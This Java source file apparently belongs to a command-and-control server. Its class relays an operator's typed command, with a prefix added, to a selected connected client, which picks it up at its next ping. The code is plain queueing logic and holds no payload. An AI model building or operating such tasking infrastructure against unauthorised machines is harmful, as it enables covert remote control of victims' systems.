package commands;

import server.CommandServer;
import server.ConnectedClient;
import tools.ParsedCommand;

/**
 * Implements a specific type of commands, where we just
 * relay what the user typed to the client, potentially
 * with a prefix change.
 * 
 * @author Yohan Chalier
 *
 */
public class ToClientCommand implements CommandInterface {
	
	private CommandServer c2;
	
	/**
	 * The command name for the client.
	 */
	private String prefix;
	
	public ToClientCommand(CommandServer c2, String prefix) {
		this.c2 = c2;
		this.prefix = prefix;
	}

	@Override
	public String exec(ParsedCommand pCmd) {
		if (c2.getCurrentClient() >= 0) {
			ConnectedClient client;
			if ((client = c2.getClients().identify(c2.getCurrentClient()))
					!= null) {
				StringBuilder cmd = new StringBuilder();
				cmd.append(prefix + " ");	// Printing prefix
				cmd.append(pCmd.argLine());	// Printing all remaining
											// arguments inline
				// Adding the command to the client queue.
				// Next ping, it will be sent to him.
				client.stackCmd(cmd.toString());
				return "Added command to stack";
			}
			return "No corresponding client found.";
		} else {
			return "Select a client first.";
		}
	}

}
